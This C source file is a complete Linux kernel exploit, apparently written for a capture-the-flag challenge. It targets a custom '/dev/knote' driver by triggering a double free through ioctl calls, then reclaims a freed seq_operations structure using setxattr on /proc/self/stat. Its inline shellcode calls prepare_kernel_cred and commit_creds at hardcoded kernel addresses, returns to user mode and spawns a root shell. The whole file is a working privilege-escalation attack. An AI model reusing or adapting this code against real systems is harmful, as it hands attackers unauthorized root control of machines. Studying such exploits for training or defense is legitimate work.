#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/xattr.h>

#define KNOTE_CREATE 0x1337
#define KNOTE_DELETE 0x1338

typedef struct {
        unsigned long idx;
        char* data;
        size_t len;
} req_t;

int fd, seq_fd;

long create(unsigned long idx, char* data, size_t len) {
        req_t req = { .idx = idx, .data = data, .len = len };
        return ioctl(fd, KNOTE_CREATE, &req);
}

long delete(unsigned long idx) {
        req_t req = { .idx = idx };
        return ioctl(fd, KNOTE_DELETE, &req);
}

void open_device() {
        if ((fd = open("/dev/knote", O_RDONLY)) < 0) {
                puts("[-] Error opening device");
                exit(1);
        }
}

void bug() {
        puts("[*] Triggering bug...");

        if (create(0, (char*) 0xacdc1337, 4) != -1) {
                puts("[-] Failed");
                exit(1);
        }

        puts("[*] Triggering double free...");

        if (delete(0) != 0) {
                puts("[-] Failed");
                exit(1);
        }
}

void shell() {
        printf("[+] UID: %d\n", getuid());
        close(seq_fd);
        system("/bin/sh");
        exit(0);
}

unsigned long bak_cs, bak_rflags, bak_ss, bak_rsp, bak_rip = (unsigned long) shell;

void backup() {
        __asm__(
                ".intel_syntax noprefix;"
                "mov bak_cs, cs;"
                "mov bak_ss, ss;"
                "mov bak_rsp, rsp;"
                "pushf;"
                "pop bak_rflags;"
                ".att_syntax;"
        );

        puts("[*] Registers backed up");
}

void shellcode() {
        __asm__(
                ".intel_syntax noprefix;"
                "mov rdi, 0;"
                "movabs rbx, 0xffffffff81053c50;"  // prepare_kernel_cred
                "call rbx;"
                "mov rdi, rax;"
                "movabs rbx, 0xffffffff81053a30;"  // commit_creds
                "call rbx;"
                "swapgs;"
                "mov r15, bak_ss;"
                "push r15;"
                "mov r15, bak_rsp;"
                "push r15;"
                "mov r15, bak_rflags;"
                "push r15;"
                "mov r15, bak_cs;"
                "push r15;"
                "mov r15, bak_rip;"
                "push r15;"
                "iretq;"
                ".att_syntax;"
        );
}

int main() {
        void *shellcode_ptr = &shellcode;

        backup();
        open_device();
        bug();

        puts("[*] Creating seq_operations structure...");
        seq_fd = open("/proc/self/stat", O_RDONLY);

        if (seq_fd < 0) {
                puts("[-] Error opening /proc/self/stat");
                exit(1);
        }

        printf("[*] Target function: %p\n", &shellcode);

        setxattr("/proc/self/stat", "exploit", &shellcode_ptr, 32, 0);
        read(seq_fd, NULL, 1);

        return 0;
}
